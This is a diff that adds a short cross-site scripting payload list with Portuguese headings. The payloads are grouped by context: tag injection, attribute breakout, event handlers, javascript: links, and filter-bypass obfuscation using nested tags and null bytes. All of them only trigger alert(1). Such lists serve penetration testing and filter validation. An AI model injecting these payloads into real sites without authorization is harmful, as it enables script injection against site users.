@@ -1,0 +1,30 @@
+HTML (Tag Injection)
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<math><mtext></title><script>alert(1)</script>
+
+Contexto: Atributo (Attribute Injection)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><body onload=alert(1)>
+"><input onfocus=alert(1) autofocus>
+
+
+Evento Inline (Event Handlers)
+" onmouseover=alert(1) "
+' onfocus=alert(1) '
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+
+
+JavaScript URI (Hrefs ou redirecionamentos)
+<a href="javascript:alert(1)">XSS</a>
+"><a href=javascript:alert(1)>XSS</a>
+
+ Obfuscados / Filtro Bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr%00ipt>alert(1)</scr%00ipt>
